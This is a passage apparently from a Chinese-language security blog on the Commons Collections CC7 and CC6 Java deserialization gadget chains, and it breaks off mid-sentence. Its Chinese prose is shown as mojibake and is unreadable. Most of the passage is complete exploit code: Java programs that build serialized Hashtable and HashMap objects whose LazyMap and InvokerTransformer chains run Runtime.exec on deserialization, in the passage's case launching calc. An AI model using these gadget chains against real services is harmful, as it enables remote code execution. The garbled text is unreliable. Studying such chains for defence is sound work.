é—®é¢˜equals()æ–¹æ³•è°ƒç”¨è§£å†³ã€‚\né‚£ä¹ˆç°åœ¨æˆ‘ä»¬åˆéœ€è¦æ³¨æ„ç¬¬ä¸€ä¸ªæ¡ä»¶ï¼Œå‰é¢æ˜¯ç›´æ¥è®¾å®šçš„æ²¡æœ‰é”®å€¼å¯¹ï¼Œä½†æ˜¯ç”±äºç¬¬äºŒä¸ªæ¡ä»¶çš„è§£å†³åŠæ³•ï¼Œå¯¼è‡´æˆ‘ä»¬è¿™é‡Œå¿…é¡»è¦æ€è€ƒå¦‚ä½•ä½¿å¾—hashç›¸åŒï¼Œæœ€åè°ƒç”¨çš„hashCodeæ–¹æ³•ï¼š æ¥ç”¨ä»£ç æµ‹è¯•çœ‹çœ‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package org.example; import java.util.HashMap; import java.util.Map; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; public class Main { public static void main(String[] args){ Transformer haha0 = new ConstantTransformer(1); Transformer haha1 = new ConstantTransformer(1); Map hashMap0 = new HashMap(); Map lazy0 = LazyMap.decorate(hashMap0,haha0); lazy0.put(\u0026#34;xx\u0026#34;, 2); Map hashMap1 = new HashMap(); Map lazy1 = LazyMap.decorate(hashMap1,haha1); lazy1.put(\u0026#34;xxxx\u0026#34;, 1); if(lazy1.hashCode()==lazy0.hashCode()){ System.out.println(\u0026#34;ç›¸ç­‰\u0026#34;); } } } æ²¡æœ‰è¾“å‡ºï¼Œè¯´æ˜ä¸æ˜¯ç›¸åŒçš„ã€‚è¿™é‡Œå°±æ¶‰åŠåˆ°äº†å“ˆå¸Œç¢°æ’çš„é—®é¢˜ï¼Œä¸å¤šè¯´ï¼Œåœ¨ysoserialé“¾ä¸­è°ƒç”¨çš„æ˜¯yyå’ŒzZï¼Œè¿™ä¸¤ä¸ªå€¼çš„hashCode()ç»“æœæ˜¯ç›¸åŒçš„ï¼š åŒæ—¶ç»“åˆå‰é¢æœ€å¼€å§‹è°ƒè¯•hashCodeé‚£éƒ¨åˆ†è¯´äº†ä¼šè°ƒç”¨åˆ°HashMapå†…éƒ¨ç±»Nodeçš„hashCode()æ–¹æ³•ï¼š æ‰€ä»¥è¿™é‡Œçš„valueä¹Ÿéœ€è¦è®¾ç½®ä¸ºç›¸åŒçš„ï¼Œæ‰€ä»¥æœ€ç»ˆçš„æµ‹è¯•ä»£ç ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package org.example; import java.util.HashMap; import java.util.Map; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; public class Main { public static void main(String[] args){ Transformer haha0 = new ConstantTransformer(1); Transformer haha1 = new ConstantTransformer(1); Map hashMap0 = new HashMap(); Map lazy0 = LazyMap.decorate(hashMap0,haha0); lazy0.put(\u0026#34;yy\u0026#34;, 1); Map hashMap1 = new HashMap(); Map lazy1 = LazyMap.decorate(hashMap1,haha1); lazy1.put(\u0026#34;zZ\u0026#34;, 1); if(lazy1.hashCode()==lazy0.hashCode()){ System.out.println(\u0026#34;ç›¸ç­‰\u0026#34;); } } } æˆåŠŸè¾“å‡ºç›¸ç­‰ã€‚\nä½†æ˜¯æ­¤æ—¶å°†è¿™ä¸ªä»£ç ç¨å¾®ä¿®æ”¹ä¸€ä¸‹åˆå¯ä»¥ç”¨æ¥æµ‹è¯•ç¬¬äºŒä¸ªæ¡ä»¶ï¼ˆä½†æ˜¯æœ‰é—®é¢˜ï¼‰ï¼Œå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 package org.example; import java.util.HashMap; import java.util.Map; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; public class Main { public static void main(String[] args){ Transformer haha0 = new ConstantTransformer(1); Transformer haha1 = new ConstantTransformer(1); Map hashMap0 = new HashMap(); Map lazy0 = LazyMap.decorate(hashMap0,haha0); lazy0.put(\u0026#34;yy\u0026#34;, 1); Map hashMap1 = new HashMap(); Map lazy1 = LazyMap.decorate(hashMap1,haha1); lazy1.put(\u0026#34;zZ\u0026#34;, 1); if(lazy0.equals(lazy1)){ System.out.println(\u0026#34;ç›¸ç­‰\u0026#34;); } } } //è¾“å‡ºï¼šç›¸ç­‰ å¾ˆæ€ªåæ­£ï¼Œä»£ç ç»å¯¹æœ‰é—®é¢˜ï¼Œè¦ä¹ˆå°±æ˜¯æˆ‘çš„JVMè™šæ‹Ÿæœºæœ‰ç‚¹é—®é¢˜ï¼Œç›´æ¥åœ¨æœ€ç»ˆequals()æ–¹æ³•åŠ æ–­ç‚¹å¯ä»¥åˆ°ï¼Œè¿™é‡Œä¸ç®¡putè¿›çš„é”®æ˜¯ä»€ä¹ˆï¼Œåªè¦ä¸¤ä¸ªå€¼éƒ½æ˜¯1å°±ä¼šè¾“å‡ºç›¸ç­‰ï¼ˆå¥½åƒonly 1ï¼‰ï¼Œä½†æ˜¯è¿™é‡Œéƒ½æ”¹æˆå…¶ä»–çš„æ¯”å¦‚2å°±ä¸ä¼šäº†ï¼Œæ”¹æˆ2å¯¹äºhashCodeåº”è¯¥ä¹Ÿæ²¡æœ‰å½±å“ï¼Œå¹¶ä¸”ä»£ç è¾“å‡ºä¹Ÿæ²¡æœ‰é—®é¢˜ã€‚\né‚£ä¹ˆå°±å¯ä»¥å°è¯•æ„é€ çœŸæ­£çš„åˆ©ç”¨é“¾äº†ï¼Œè¿˜éœ€è¦æ³¨æ„çš„å°±æ˜¯åœ¨ç¬¬äºŒæ¬¡putçš„æ—¶å€™å°±ä¼šæ‰§è¡Œä¸€æ¬¡è°ƒç”¨é“¾äº†ï¼Œæ­¤æ—¶å°±éœ€è¦æ³¨æ„LazyMapçš„get()æ–¹æ³•ï¼Œå’Œä¹‹å‰çš„CC6å·®ä¸å¤šï¼Œéœ€è¦removeï¼Œç›´æ¥æ‰“æ–­ç‚¹æ¥çœ‹ä¼ è¿›å»çš„å€¼ï¼š\nå†çœ‹è¿›å…¥è¿™ä¸ªgetæ–¹æ³•çš„equals()æ–¹æ³•çš„ä½ç½®ï¼š\næ­¤æ—¶çš„keyæ˜¯lazy0çš„é”®ï¼Œæ‰€ä»¥è¿™é‡Œä¼šå¯¹lazy1çš„å“ˆå¸Œè¡¨å†putè¿›ä¸€ä¸ªå€¼ï¼š\nè¿™é‡Œç»“æœæ˜¯1å¾ˆæ­£å¸¸ï¼ŒfakeTransformeré“¾å­è¿”å›çš„å°±æ˜¯è¿™ä¸ªã€‚\næ‰€ä»¥åºåˆ—åŒ–çš„æ—¶å€™ä¼šå‘hashMap1ä¸­putè¿›ä¸€ä¸ªï¼ˆyy-1ï¼‰çš„é”®å€¼å¯¹ï¼Œä¸ºäº†åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œè®©hashå€¼ç›¸ç­‰ï¼Œèƒ½å¤ŸæˆåŠŸæ‰§è¡Œåˆ°è¿™é‡Œçš„transform()æ–¹æ³•ï¼Œæ‰€ä»¥éœ€è¦removeè¿™ä¸ªhashMap1ä¸­çš„è¿™ä¸ªé”®å€¼å¯¹ã€‚\næœ€ç»ˆæ„æˆå¦‚ä¸‹ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; import java.lang.reflect.Field; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Hashtable hashtable = new Hashtable(); Map hashMap0 = new HashMap(); Map lazy0 = LazyMap.decorate(hashMap0,chain); lazy0.put(\u0026#34;yy\u0026#34;, 2); Map hashMap1 = new HashMap(); Map lazy1 = LazyMap.decorate(hashMap1,chain); lazy1.put(\u0026#34;zZ\u0026#34;, 2); hashtable.put(lazy0,1); hashtable.put(lazy1,2); hashMap1.remove(\u0026#34;yy\u0026#34;); Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashtable); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } æˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚\nåé¢å†çœ‹å‘ç°å…¶å®å…¶ä¸­æœ‰ä¸€ä¸ªç‚¹æ˜¯æ²¡æœ‰è¯´æ¸…æ¥šçš„ï¼Œç¡®å®åœ¨åºåˆ—åŒ–ä¹‹å‰æ˜¯å¯ä»¥æˆåŠŸè°ƒç”¨åˆ°LazyMapçš„get()æ–¹æ³•ï¼Œä½†æ˜¯å¯¹äºæ˜¯å¦ä¼šæ›¿æ¢è¿™ä¸ªé—®é¢˜æ²¡æœ‰è¯´æ¸…æ¥šï¼Œä¹Ÿå°±æ˜¯å¯¹åº”å¦‚ä¸‹ä»£ç ï¼š\nåœ¨åºåˆ—åŒ–å‰ï¼Œè¿™é‡Œåˆ°åº•ä¸ºä»€ä¹ˆä¸æ›´æ¢å€¼ã€‚å‰é¢ä»æ„å»ºçš„ä»£ç å±‚é¢ç®€å•è¯´äº†ä¸€ä¸‹åˆ©ç”¨æ–¹æ³•ã€‚ç°åœ¨POCä¹Ÿç»™å‡ºæ¥äº†ï¼Œå°±è·Ÿä¸€ä¸‹åº•å±‚æ¥æŸ¥çœ‹ä¸€ä¸‹ï¼š\nç›´æ¥æ‰“æ–­ç‚¹äºAbstractMapç±»çš„equals()æ–¹æ³•ï¼š\nè¿™é‡Œå°±æ˜¯æœŸæœ›æ‰§è¡Œget()æ–¹æ³•çš„åœ°æ–¹ï¼Œç”±äºç°åœ¨æ˜¯åºåˆ—åŒ–å‰ï¼Œç»è¿‡ä»£ç çš„æ„é€ ï¼Œä¸ä¼šå¼¹è®¡ç®—æœºï¼Œè·Ÿè¿›ä¸€ä¸‹è¿™é‡Œä¼šæ‰§è¡Œçš„LazyMapç±»çš„get()æ–¹æ³•ï¼š\nç”±äºæˆ‘ä»¬æ„é€ çš„transformæ‰§è¡Œç»“æœå°±ï¼Œæ˜¯è¿”å›ä¸€ä¸ª1ï¼Œå¹¶ä¸”æœ€åè¿”å›çš„è¿™ä¸ªvalueï¼Œæ‰€ä»¥ m.get(key) å°±æ˜¯è¿”å›ä¸€ä¸ª1ï¼Œä¹Ÿæ˜¯å› ä¸ºåœ¨è¿™é‡Œå¾€hashMap1ä¸­æ”¾è¿›äº†ä¸€ä¸ªé”®å€¼å¯¹ï¼Œä¸ºäº†ååºåˆ—åŒ–æ—¶èƒ½é€šè¿‡hashå€¼ç›¸åŒï¼Œæ‰€ä»¥åé¢åŠ äº†ä¸€ä¸ªremoveæ“ä½œã€‚\nç»§ç»­çœ‹ï¼š\næ‰€ä»¥ç°åœ¨æ¯”è¾ƒçš„å°±æ˜¯valueå’Œ1çš„ç›¸ç­‰å…³ç³»ï¼Œè€Œè¿™é‡Œçš„valueæ˜¯2ï¼š\nå…¶å®ä»ä»£ç å±‚é¢ä¹Ÿèƒ½çœ‹å‡ºæ¥ï¼Œæœ¬æ¥æœ€å¼€å§‹å°±æ˜¯putçš„yy =\u0026gt; 2ï¼Œè¿™é‡Œæ˜¯è‚¯å®šä¸ç›¸ç­‰çš„ï¼Œæ‰€ä»¥å–ååå°±æ˜¯trueäº†ï¼Œtrueè¿”å›äº†falseï¼Œæ‰€ä»¥æœ€åæ‰æ²¡æœ‰æ¢å€¼ã€‚\nè¿™æ ·ä¹Ÿèƒ½è§£å†³ä¸ºä»€ä¹ˆå‰é¢è¯´çš„only1å°±ä¸è¡Œäº†ï¼Œå¦‚æœæˆ‘putè¿›çš„æ˜¯1ï¼Œé‚£ä¹ˆè¿™é‡Œå°±ä¼šä¸transformè¿”å›çš„1ç›¸ç­‰ï¼Œæœ€åå°±ä¼šè¿”å›trueã€‚\né‚£ä¹ˆæˆ‘å°±æ˜¯è¦ç”¨1å‘¢ï¼Œå¦‚ä¸‹ä¸€ä¸ªæ“ä½œå°±è¡Œï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 package java_foundation; import java.util.HashMap; import java.lang.reflect.Field; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import javax.management.BadAttributeValueExpException; import java.lang.Class; import javax.xml.transform.Templates; import org.apache.commons.collections.keyvalue.TiedMapEntry; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import java.util.Map; import org.apache.commons.collections.map.LazyMap; import java.util.HashSet; import java.util.Hashtable; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.nio.file.Files; import java.nio.file.Paths; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileOutputStream; import java.io.FileInputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\Test.class\u0026#34;)); TemplatesImpl mpl =new TemplatesImpl(); setFieldValue(mpl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(mpl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(mpl,\u0026#34;_class\u0026#34;,null); setFieldValue(mpl,\u0026#34;_tfactory\u0026#34;,new TransformerFactoryImpl()); Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(2)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Hashtable hashtable = new Hashtable(); Map hashMap0 = new HashMap(); hashMap0.put(\u0026#34;yy\u0026#34;,1); Map lazy0 = LazyMap.decorate(hashMap0,chain); Map hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,1); Map lazy1 = LazyMap.decorate(hashMap1,chain); hashtable.put(lazy0,1); hashtable.put(lazy1,1); hashMap1.remove(\u0026#34;yy\u0026#34;); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashtable); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object mpl,String name,Object value) throws Exception { Field field = mpl.getClass().getDeclaredField(name); field.setAccessible(true); field.set(mpl,value); } } é‡ç‚¹è¿˜æ˜¯ä»£ç çš„ç†è§£ã€‚\né—®é¢˜ï¼š\nä¸åŠ é”®å€¼å¯¹ç›´æ¥åˆ°size()é—®é¢˜ å“ˆå¸Œç¢°æ’é—®é¢˜ ä¸ºä»€ä¹ˆå¯¹LazyMapä½¿ç”¨putæ—¶çš„é”®å€¼å¯¹çš„å€¼éœ€è¦ç›¸åŒï¼Œå¯èƒ½æ˜¯å†…éƒ¨ç±»Nodeé‚£é‡Œçš„hashCodeæ–¹æ³•åŸå› ã€‚ ","date":"2025-01-22T14:00:24+08:00","permalink":"https://fupanc-w1n.github.io/p/cc7/","title":"CC7"},{"content":"CC6 åœ¨CC1å·²ç»è¯´è¿‡äº†ï¼Œåœ¨JDK 8u71ä»¥åï¼Œå®˜æ–¹ä¿®æ”¹äº†AnnotationInvocationHandlerçš„readObject()æ–¹æ³•ï¼Œå¯¼è‡´CC1ä¸èƒ½å†åˆ©ç”¨ã€‚\næ‰€ä»¥ç°åœ¨éœ€è¦æ‰¾å¯»æ–°çš„åˆ©ç”¨é“¾ç”¨äºè§£å†³é«˜ç‰ˆæœ¬Javaçš„é—®é¢˜ï¼Œç°åœ¨å…ˆæ¥çœ‹è¿™ä¸ªåˆ©ç”¨é“¾ã€‚\næµ‹è¯•ç¯å¢ƒ\nJDK 8u411 commons-collections 3.2.1 ä»£ç è°ƒè¯• åœ¨å‰é¢çš„CC1çš„LazyMapé“¾ä¸­åˆ©ç”¨çš„å°±æ˜¯get()æ–¹æ³•ï¼Œé‚£ä¹ˆç°åœ¨å…¶å®è¿˜å¯ä»¥å¯»æ‰¾åœ¨ä¸Šä¸‹æ–‡ä¸­æ˜¯å¦è¿˜æœ‰å…¶ä»–è°ƒç”¨LazyMap#get()çš„ç±»ï¼Œå¹¶ä¸”è¦æ±‚è¿™ä¸ªå¯åˆ©ç”¨çš„ç±»å®ç°äº†Serializableæ¥å£ã€‚ åœ¨è¿™é‡Œæ‰¾åˆ°çš„ç±»æ˜¯org.apache.commons.collections.keyvalue.TiedMapEntryï¼Œé‡ç‚¹å°±æ˜¯ä¸‹é¢çš„ä¸¤ä¸ªæ–¹æ³•ï¼Œåˆ†åˆ«æ˜¯ï¼š\n1 2 3 4 5 6 7 8 9 //getValue() public Object getValue() { return this.map.get(this.key); } //hashCode() public int hashCode() { Object value = this.getValue(); return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); } åœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ°åœ¨hashCode()æ–¹æ³•ä¸­è°ƒç”¨äº†getValue()æ–¹æ³•ï¼Œåœ¨getValue()æ–¹æ³•ä¸­çš„this.map.get(this.key);ï¼Œåªè¦è¿™é‡Œå¯ä»¥å°†this.mapçš„å€¼è®¾ç½®ä¸ºLazyMapçš„å®ä¾‹ï¼Œå°±åˆå¯ä»¥æˆä¸ºä¸€ä¸ªåˆ©ç”¨é“¾çš„èµ·å§‹ç‚¹ã€‚\næ‰€ä»¥ç°åœ¨éœ€è¦å…ˆæ‰¾åˆ°å¯ä»¥ä½¿ç”¨ä»€ä¹ˆç±»æ¥è§¦å‘TiedMapEntry#hashCode()æ–¹æ³•ï¼Œåœ¨è¿™é‡Œï¼ŒåŒæ ·çš„æœ‰ä¸¤æ¡é“¾å­ï¼Œåˆ†åˆ«æ˜¯HashMapå’ŒHashSet\nåˆ©ç”¨HashMap åˆ©ç”¨é“¾ä»£ç å®¡è®¡ æ­¤æ—¶æˆ‘æƒ³åˆ°äº†URLDNSé“¾ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªæ­¥éª¤è°ƒç”¨äº†hashCode()æ–¹æ³•ï¼Œå¦‚ä¸‹ï¼š è¿™é‡Œå°±æ˜¯è°ƒç”¨çš„keyçš„hashCodeæ–¹æ³•ï¼Œåœ¨URLDNSä¸­çš„è¿™ä¸ªkeyå¯¹åº”çš„æ˜¯URLç±»å®ä¾‹ï¼Œæ‰€ä»¥URLDNSä¸­è°ƒç”¨çš„æ˜¯URLç±»çš„hashCode()æ–¹æ³•ï¼Œé‚£ä¹ˆç°åœ¨å…¶å®ä¹Ÿæ¯”è¾ƒç®€å•äº†ï¼Œå…ˆå¤§æ¦‚æƒ³ä¸€ä¸‹æµç¨‹ï¼š\nè¿™é‡Œè‚¯å®šæ˜¯ç”¨HashMapä½œä¸ºåºåˆ—åŒ–ä»¥åŠååºåˆ—åŒ–çš„å¯¹è±¡ å¾ˆç®€å•äº†ï¼Œç„¶ååœ¨ååºçš„æ—¶å€™è‡ªç„¶ä¼šåˆ°hash()æ–¹æ³•ï¼Œæ­¤æ—¶æˆ‘ä»¬éœ€è¦åœ¨è¦åºåˆ—åŒ–çš„ä»£ç ä¸­putè¿›ä¸€ä¸ªkeyä¸ºTiedMapEntryç±»çš„å®ä¾‹ï¼Œè®©è¿™ä¸ªkeyç­‰äºTiedMapEntryå¯¹è±¡ï¼Œè¿™æ ·å°±ä¼šé¡ºåˆ©è°ƒç”¨åˆ°TiedMapEntryç±»çš„hashCode()æ–¹æ³•ï¼Œç„¶åå†å°†TiedMapEntryç±»é‡Œé¢çš„mapè®¾ç½®ä¸ºLazyMapç±»çš„å®ä¾‹ï¼Œè¿™æ ·å°±ä¼šæˆåŠŸè°ƒç”¨åˆ°LazyMapç±»çš„getæ–¹æ³•ï¼Œåé¢å°±æ˜¯CC1ä¸­æè¿‡çš„äº†ã€‚ æµç¨‹åŸºæœ¬æ¸…æ¥šï¼Œç°åœ¨å°±æ˜¯å¦‚ä½•è®¾è®¡ä»£ç äº†\nç„¶åå°±æ˜¯çœ‹å¦‚ä½•ä¼ å…¥åŸºæœ¬ç›˜äº†ï¼ŒåŸºæœ¬ç›˜å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 //åŸºæœ¬ç›˜ package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.lang.annotation.Retention; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Retention.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); } } ç°åœ¨å°±æ˜¯éœ€è¦å°†è¿™ä¸ªåŸºæœ¬ç›˜ä¼ å…¥TiedMapEntryç±»ï¼Œçœ‹ä¸€ä¸‹è¿™ä¸ªç±»çš„æ„é€ æ–¹æ³•ï¼š\néƒ½æ˜¯publicï¼Œé‚£ä¹ˆç›´æ¥å¼•å…¥å³å¯ï¼Œæ‰€ä»¥è¿™é‡Œçš„åˆ©ç”¨ä»£ç å°±æ˜¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.lang.annotation.Retention; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map lazy = LazyMap.decorate(null,chain); TiedMapEntry o = new TiedMapEntry(lazy,null); HashMap hashMap = new HashMap(); hashMap.put(o,\u0026#34;xxx\u0026#34;); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } æŠ¥é”™æ˜¾ç¤ºåœ¨å®ä¾‹åŒ–LazyMapé‚£é‡Œä¸èƒ½ä¼ å…¥nullï¼Œ\né‚£ä¹ˆæˆ‘å°±å†åˆ›ä¸€ä¸ªHashMapå®ä¾‹è¿›å»èµ‹å€¼ï¼Œé‚£ä¹ˆæµ‹è¯•ä»£ç å°±æ˜¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.lang.annotation.Retention; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry o = new TiedMapEntry(lazy,null); HashMap hashMap = new HashMap(); hashMap.put(o,\u0026#34;xxx\u0026#34;); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } è¿è¡Œç»“æœå¦‚ä¸‹ï¼š\nè™½ç„¶æˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼Œæœ¬æ¥ä¹Ÿä»¥ä¸ºåªæ˜¯å¹³å¸¸çš„æŠ¥é”™ï¼Œç„¶åå»çœ‹äº†ä¸€ä¸‹å…¶ä»–æ–‡ç« ï¼Œå‘ç°æ˜¯è‡ªå·±çš„ä»£ç æœ‰é—®é¢˜ï¼Œé¦–å…ˆå°±æ˜¯åœ¨hashMap.put()ï¼Œæœ¬èº«çš„put()æ–¹æ³•å°±æ˜¯ä¸HashMap#readObject()çš„éƒ¨åˆ†æºç ç›¸åŒï¼š\nè¿™æ ·åœ¨putæ—¶å°±ä¼šè§¦å‘ä¸€æ¬¡åˆ©ç”¨é“¾ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆä¼šå¼¹å‡ºè®¡ç®—æœºçš„åŸå› ï¼ˆåé¢ä¼šè¯´è¿™ä¸ªçš„è§£å†³æ–¹æ³•ï¼‰ã€‚\nå†æ¥çœ‹è¿™ä¸ªæŠ¥é”™å†…å®¹ï¼š\nè¿™ä¸ªæŠ¥é”™å†…å®¹æ˜¾ç¤ºæˆ‘åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­è¯•å›¾åºåˆ—åŒ–ä¸€ä¸ªä¸å¯åºåˆ—åŒ–çš„execæ‰§è¡Œåè¿”å›çš„Processå¯¹è±¡ï¼Œç„¶åå‰é¢çš„CC1å´æ²¡æœ‰æŠ¥è¿™æ ·çš„é”™ï¼Œè¿™é‡Œå°±çœ‹çœ‹å·®åˆ«(ä¸ªäººç†è§£ï¼Œä»…ä¾›å‚è€ƒ)ï¼š\nå¯¹äºå‰é¢çš„é”™è¯¯ä»£ç ï¼šé¦–å…ˆå°±æ˜¯æˆ‘ä»¬newäº†ä¸€ä¸ªHashMapå®ä¾‹ï¼Œç„¶åæˆ‘ä»¬å¾€é‡Œé¢putè¿›äº†ä¸€ä¸ªTiedMapEntryç±»å®ä¾‹ï¼Œè€Œåœ¨åºåˆ—åŒ–HashMapæ—¶ï¼Œä¼šéå† HashMap ä¸­çš„æ¯ä¸ª Map.Entry 